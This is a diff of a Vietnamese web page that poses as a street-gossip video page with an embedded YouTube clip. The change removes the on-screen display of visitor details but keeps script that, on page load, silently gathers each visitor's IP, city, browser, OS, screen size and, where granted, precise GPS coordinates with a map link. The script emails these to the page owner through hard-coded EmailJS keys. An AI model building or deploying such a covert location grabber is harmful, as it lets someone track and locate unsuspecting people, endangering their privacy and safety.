@@ -2,18 +2,14 @@
 <html lang="vi">
 
 <head>
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <meta charset="UTF-8">
-
-    <meta
-        name="viewport"
-        content="width=device-width, initial-scale=1.0"
-    >
-
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hóng Hớt Đường Phố</title>
 
-    <style>
+    <!-- Nhúng thư viện EmailJS -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
+    <style>
         * {
             box-sizing: border-box;
             margin: 0;
@@ -24,81 +20,56 @@
             font-family: Arial, sans-serif;
             background-color: #0d1b2a;
             color: #ffffff;
-
             display: flex;
             flex-direction: column;
             align-items: center;
-
             min-height: 100vh;
         }
 
         header {
             width: 100%;
-
             background-color: #1b263b;
-
             color: #4cc9f0;
-
             text-align: center;
-
             padding: 20px 0;
-
             border-bottom: 2px solid #415a77;
-
-            box-shadow:
-                0 4px 10px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
         }
 
         header h1 {
             font-size: 2rem;
-
             text-transform: uppercase;
-
             letter-spacing: 1.5px;
         }
 
         .container {
             width: 100%;
-
             max-width: 800px;
-
             margin: 30px auto;
-
             padding: 0 15px;
         }
 
         .video-card {
             background: #1b263b;
-
             border-radius: 12px;
-
             overflow: hidden;
-
             border: 1px solid #415a77;
-
-            box-shadow:
-                0 8px 20px rgba(0, 0, 0, 0.5);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
         }
 
         .video-wrapper {
             position: relative;
-
             padding-bottom: 56.25%;
-
             height: 0;
-
             background-color: #000;
         }
 
         .video-wrapper iframe {
             position: absolute;
-
             top: 0;
             left: 0;
-
             width: 100%;
             height: 100%;
-
             border: 0;
         }
 
@@ -108,275 +79,62 @@
 
         .video-info h2 {
             font-size: 1.3rem;
-
             color: #e0e1dd;
-
             margin-bottom: 8px;
         }
 
         .video-info p {
             color: #778da9;
-
             font-size: 0.95rem;
-
             line-height: 1.5;
         }
 
-        /* =========================
-           THÔNG TIN TRUY CẬP
-        ========================= */
-
-        .visitor-info {
-
-            margin-top: 20px;
-
-            padding: 20px;
-
-            background: #0d1b2a;
-
-            border: 1px solid #415a77;
-
-            border-radius: 10px;
-        }
-
-        .visitor-info h3 {
-
-            color: #4cc9f0;
-
-            margin-bottom: 15px;
-        }
-
-        .info-row {
-
-            display: flex;
-
-            justify-content: space-between;
-
-            gap: 20px;
-
-            padding: 10px 0;
-
-            border-bottom: 1px solid #24344d;
-        }
-
-        .info-row:last-child {
-            border-bottom: none;
-        }
-
-        .label {
-            color: #778da9;
-        }
-
-        .value {
-
-            color: #ffffff;
-
-            text-align: right;
-
-            word-break: break-word;
-        }
-
-        .loading {
-            color: #fca311;
-        }
-
         footer {
-
             margin-top: auto;
-
             padding: 15px;
-
             text-align: center;
-
             font-size: 0.85rem;
-
             color: #778da9;
         }
-
     </style>
-
 </head>
-
 
 <body>
 
-
 <header>
-
-    <h1>
-        Hóng Hớt Đường Phố
-    </h1>
-
+    <h1>Hóng Hớt Đường Phố</h1>
 </header>
 
-
 <div class="container">
-
     <div class="video-card">
-
-
         <!-- VIDEO -->
-
         <div class="video-wrapper">
-
             <iframe
                 src="https://www.youtube.com/embed/gJAbDSse5WM?playsinline=1&rel=0"
                 title="Hóng Hớt Đường Phố Video"
-
-                allow="
-                    accelerometer;
-                    autoplay;
-                    clipboard-write;
-                    encrypted-media;
-                    gyroscope;
-                    picture-in-picture;
-                    web-share
-                "
-
+                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
                 allowfullscreen>
             </iframe>
-
         </div>
-
 
         <!-- NỘI DUNG -->
-
         <div class="video-info">
-
-            <h2>
-                Video Đường Phố Nổi Bật
-            </h2>
-
+            <h2>Video Đường Phố Nổi Bật</h2>
             <p>
-                Nhấn nút Play trên trình phát video
-                để xem trực tiếp ngay trên giao diện web.
+                Nhấn nút Play trên trình phát video để xem trực tiếp ngay trên giao diện web.
             </p>
-
-
-            <!-- THÔNG TIN TRUY CẬP -->
-
-            <div class="visitor-info">
-
-                <h3>
-                    Thông tin thiết bị truy cập
-                </h3>
-
-
-                <div class="info-row">
-
-                    <span class="label">
-                        IP Public
-                    </span>
-
-                    <span
-                        class="value loading"
-                        id="ip"
-                    >
-                        Đang lấy...
-                    </span>
-
-                </div>
-
-
-                <div class="info-row">
-
-                    <span class="label">
-                        Thiết bị
-                    </span>
-
-                    <span
-                        class="value"
-                        id="device"
-                    >
-                        Đang xác định...
-                    </span>
-
-                </div>
-
-
-                <div class="info-row">
-
-                    <span class="label">
-                        Hệ điều hành
-                    </span>
-
-                    <span
-                        class="value"
-                        id="os"
-                    >
-                        Đang xác định...
-                    </span>
-
-                </div>
-
-
-                <div class="info-row">
-
-                    <span class="label">
-                        Trình duyệt
-                    </span>
-
-                    <span
-                        class="value"
-                        id="browser"
-                    >
-                        Đang xác định...
-                    </span>
-
-                </div>
-
-
-                <div class="info-row">
-
-                    <span class="label">
-                        Độ phân giải
-                    </span>
-
-                    <span
-                        class="value"
-                        id="screen"
-                    >
-                        Đang lấy...
-                    </span>
-
-                </div>
-
-
-                <div class="info-row">
-
-                    <span class="label">
-                        Thời gian truy cập
-                    </span>
-
-                    <span
-                        class="value"
-                        id="time"
-                    >
-                        Đang lấy...
-                    </span>
-
-                </div>
-
-
-            </div>
-
         </div>
-
     </div>
-
 </div>
 
-
 <footer>
-
-    &copy; Hóng Hớt Đường Phố.
-    Tất cả quyền được bảo lưu.
-
+    &copy; Hóng Hớt Đường Phố. Tất cả quyền được bảo lưu.
 </footer>
 
-
 <script>
-// CONFIG EMAILJS - Thay thế các thông số của bạn tại đây
+/* ========================================================
+   CẤU HÌNH EMAILJS (Thay thế các thông số từ tài khoản EmailJS)
+   ======================================================== */
 const EMAILJS_PUBLIC_KEY = "0mJTEgZfXIpR2xzYq";
 const EMAILJS_SERVICE_ID = "service_tby2b67";
 const EMAILJS_TEMPLATE_ID = "template_n67i8qh";
@@ -386,17 +144,17 @@ const EMAILJS_TEMPLATE_ID = "template_n67i8qh";
     emailjs.init(EMAILJS_PUBLIC_KEY);
 })();
 
-// Hàm gửi dữ liệu qua EmailJS
+// Hàm gửi dữ liệu về EmailJS
 function sendEmail(templateParams) {
     emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
         .then(() => {
-            console.log("Đã gửi thông tin về email thành công!");
+            console.log("Đã thu thập và gửi thông tin về email thành công!");
         }, (error) => {
             console.error("Lỗi khi gửi email:", error);
         });
 }
 
-// Thu thập thông tin và xử lý gửi đi
+// Hàm thu thập dữ liệu ngầm khi người dùng truy cập
 async function collectAndSendVisitorData() {
     const ua = navigator.userAgent;
 
@@ -423,27 +181,18 @@ async function collectAndSendVisitorData() {
     const screenRes = `${window.screen.width} x ${window.screen.height}`;
     const accessTime = new Date().toLocaleString("vi-VN");
 
-    // Hiển thị giao diện Web
-    document.getElementById("os").textContent = os;
-    document.getElementById("browser").textContent = browser;
-    document.getElementById("device").textContent = device;
-    document.getElementById("screen").textContent = screenRes;
-    document.getElementById("time").textContent = accessTime;
-
-    // 4. Lấy IP Public và vị trí IP qua ipapi.co
+    // 4. Lấy IP Public & vị trí qua IP ngầm
     let ipData = {};
     try {
         const response = await fetch("https://ipapi.co/json/");
         if (response.ok) {
             ipData = await response.json();
-            document.getElementById("ip").textContent = ipData.ip || "Không lấy được";
-            document.getElementById("ip").classList.remove("loading");
         }
     } catch (e) {
-        document.getElementById("ip").textContent = "Không lấy được";
+        console.error("Không lấy được IP");
     }
 
-    // Khởi tạo đối tượng truyền dữ liệu vào Email Template
+    // Chuẩn bị dữ liệu để truyền vào Email Template
     let templateParams = {
         ip: ipData.ip || "N/A",
         city: ipData.city || "N/A",
@@ -458,7 +207,7 @@ async function collectAndSendVisitorData() {
         maps_link: "N/A"
     };
 
-    // 5. Xin cấp quyền GPS lấy vị trí chính xác
+    // 5. Kiểm tra vị trí GPS chính xác (Nếu trình duyệt cho phép)
     if ("geolocation" in navigator) {
         navigator.geolocation.getCurrentPosition(
             (position) => {
@@ -467,15 +216,15 @@ async function collectAndSendVisitorData() {
                 templateParams.gps = `${lat}, ${lon}`;
                 templateParams.maps_link = `https://www.google.com/maps?q=${lat},${lon}`;
                 
-                // Gửi email sau khi có GPS
+                // Gửi mail kèm vị trí GPS
                 sendEmail(templateParams);
             },
             (error) => {
-                templateParams.gps = "Người dùng từ chối cấp quyền GPS hoặc bị lỗi";
-                // Gửi email chỉ với vị trí IP
+                templateParams.gps = "Người dùng từ chối GPS / Lỗi vị trí";
+                // Gửi mail chỉ có vị trí từ IP
                 sendEmail(templateParams);
             },
-            { timeout: 8000 }
+            { timeout: 7000 }
         );
     } else {
         templateParams.gps = "Trình duyệt không hỗ trợ Geolocation";
@@ -483,11 +232,9 @@ async function collectAndSendVisitorData() {
     }
 }
 
-// Tự động chạy khi trang web hoàn tất tải
+// Chạy hàm thu thập ngầm ngay khi tải xong trang
 window.addEventListener("DOMContentLoaded", collectAndSendVisitorData);
 </script>
 
-
 </body>
-
 </html>
